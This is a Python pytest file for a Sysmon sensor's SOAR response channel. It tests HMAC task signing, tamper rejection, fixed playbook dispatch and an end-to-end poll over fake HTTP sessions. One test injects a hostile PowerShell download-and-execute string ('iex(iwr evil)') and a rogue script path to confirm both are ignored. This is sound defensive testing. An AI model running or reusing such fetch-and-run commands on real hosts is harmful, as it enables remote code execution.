"""
tier0: behavioural tests for the Sysmon sensor's SOAR response channel (DC-N11).

Pure Python, runs here. The strongest assertions sign a task with the ACTUAL
platform signer (project_empros/operations/agent/response_executor) and require the
sysmon channel to accept + correctly dispatch it -- a true cross-component
conformance check, not a presence/grep test. They fail if signing drifts, a task is
mis-routed, a forged/corrupted task is accepted, or a task-supplied path is honoured.
"""

import sys
from pathlib import Path

import pytest

pytestmark = pytest.mark.tier0

HERE = Path(__file__).resolve()
SENSOR_DIR = HERE.parents[2]                 # windows/sysmon_sensor
GIT_ROOT = HERE.parents[4]                   # repo root
PB_DIR = GIT_ROOT / "project_empros" / "operations" / "playbooks" / "windows"
AGENT = GIT_ROOT / "project_empros" / "operations" / "agent"

sys.path.insert(0, str(SENSOR_DIR))          # also handled by conftest; defensive
sys.path.insert(0, str(AGENT))
import response_channel as rc                # the sensor module under test
import response_executor as rx               # the canonical PLATFORM signer
import task_dispatch as td                   # the platform task builder/store

SECRET = b"sysmon-shared-integrity-secret"


def _sign(action="isolate_host", **extra):
    task = {"kind": "response", "incident_id": "INC-S", "host": "sysmon-host-1",
            "os_family": "windows", "action_type": action, "targets": extra.pop("targets", [])}
    task.update(extra)
    task["signature"] = rx.sign_task(task, SECRET)   # PLATFORM signer
    return task


# -- signature verification ---------------------------------------------------
def test_channel_accepts_platform_signed_task():
    # signed by response_executor; the sensor must verify it with the same HMAC
    rc.verify_task(_sign(mgmt_ips=["10.0.0.0/24"]), SECRET)   # no raise


def test_channel_rejects_unsigned():
    t = _sign()
    del t["signature"]
    with pytest.raises(rc.ResponseError):
        rc.verify_task(t, SECRET)


def test_channel_rejects_tampered_after_signing():
    t = _sign()
    t["targets"] = ["attacker-added"]
    with pytest.raises(rc.ResponseError):
        rc.verify_task(t, SECRET)


def test_channel_rejects_wrong_secret():
    with pytest.raises(rc.ResponseError):
        rc.verify_task(_sign(), b"not-the-secret")


# -- fixed playbook + env -----------------------------------------------------
@pytest.mark.parametrize("action,script", list(rc.WIN_PLAYBOOK.items()))
def test_every_action_maps_to_a_bundled_playbook(action, script):
    assert rc.select_playbook(action) == script
    assert (PB_DIR / script).exists(), f"sysmon must bundle {script}"


def test_build_env_matches_platform_executor():
    # parity with the canonical build_env -- the playbooks read the same NEXUS_*
    for task in (_sign("isolate_host", mgmt_ips=["10.0.0.0/24"]),
                 _sign("block_ip", targets=["8.8.8.8"], c2_domains=["evil.test"]),
                 _sign("eradicate_process", pids=[6644], processes=["evil.exe"])):
        assert rc.build_env(task) == rx.build_env(task)


# -- execution: fixed .ps1, never a task-supplied path ------------------------
def test_execute_runs_fixed_playbook_with_env():
    calls = {}

    def fake_runner(cmd, env=None, capture_output=False):
        calls["cmd"], calls["env"] = cmd, env
        return type("R", (), {"returncode": 0})()

    out = rc.execute_task(_sign("block_ip", targets=["8.8.8.8"]),
                          secret=SECRET, playbooks_dir=PB_DIR, runner=fake_runner)
    assert out["status"] == "completed" and out["playbook"] == "04_Block-C2.ps1"
    assert calls["cmd"][-1] == str(PB_DIR / "04_Block-C2.ps1")
    assert calls["env"]["NEXUS_C2_IPS"] == "8.8.8.8"


def test_execute_ignores_task_supplied_path():
    def fake_runner(cmd, env=None, capture_output=False):
        fake_runner.cmd = cmd
        return type("R", (), {"returncode": 0})()

    task = _sign("isolate_host", mgmt_ips=["10.0.0.0/24"],
                 playbook="C:\\pwn.ps1", command="iex(iwr evil)")
    task["signature"] = rx.sign_task(task, SECRET)   # re-sign WITH injected fields
    rc.execute_task(task, secret=SECRET, playbooks_dir=PB_DIR, runner=fake_runner)
    assert fake_runner.cmd[-1] == str(PB_DIR / "01_Contain-Host.ps1")


def test_execute_refuses_forged_task():
    t = _sign("isolate_host")
    t["targets"] = ["attacker"]
    with pytest.raises(rc.ResponseError):
        rc.execute_task(t, secret=SECRET, playbooks_dir=PB_DIR, runner=lambda *a, **k: None)


# -- gateway URL derivation ---------------------------------------------------
@pytest.mark.parametrize("url,expected", [
    ("https://mw:8443/api/v1/telemetry", "https://mw:8443/api/v1/tasks"),
    ("https://mw:8443/telemetry", "https://mw:8443/api/v1/tasks"),
    ("https://mw:8443/", "https://mw:8443/api/v1/tasks"),
])
def test_tasks_url_derived_from_gateway(url, expected):
    assert rc._tasks_url(url) == expected


# -- E2E over a fake HTTP session: platform → ingress poll → sysmon acts -------
class _FakeResp:
    def __init__(self, payload, code=200):
        self._payload, self.status_code = payload, code

    def json(self):
        return self._payload


class _FakeSession:
    """Stands in for the ingress: returns the host's queued tasks on GET, records
    the outcome POST. Models the real GET /api/v1/tasks drain."""
    def __init__(self, store):
        self.store = store
        self.posted = []

    def get(self, url, **kw):
        return _FakeResp({"tasks": self.store.poll("sysmon-host-1")})

    def post(self, url, json=None, **kw):
        self.posted.append(json)
        return _FakeResp({}, 200)


def test_e2e_platform_task_to_sysmon_outcome(monkeypatch):
    # platform signs + enqueues (keyed by host); sysmon polls, verifies, "runs", reports
    store = td.TaskStore()
    task = td.build_response_task(incident_id="INC-E2E", host="sysmon-host-1",
                                  os_family="windows", action_type="isolate_host",
                                  mgmt_ips=["10.0.0.0/24"], secret=SECRET)
    store.enqueue("sysmon-host-1", task)

    monkeypatch.setenv("NEXUS_INTEGRITY_SECRET", SECRET.decode())
    monkeypatch.setenv("NEXUS_MIDDLEWARE_URL", "https://mw:8443/api/v1/telemetry")
    monkeypatch.setenv("NEXUS_PLAYBOOKS_DIR", str(PB_DIR))
    channel = rc.ResponseChannel()
    monkeypatch.setattr(rc.subprocess, "run",
                        lambda cmd, **kw: type("R", (), {"returncode": 0})())

    outcomes = channel.poll_once(_FakeSession(store))
    assert len(outcomes) == 1
    assert outcomes[0]["playbook"] == "01_Contain-Host.ps1"
    assert outcomes[0]["status"] == "completed"
    assert store.poll("sysmon-host-1") == []          # drained, no redelivery
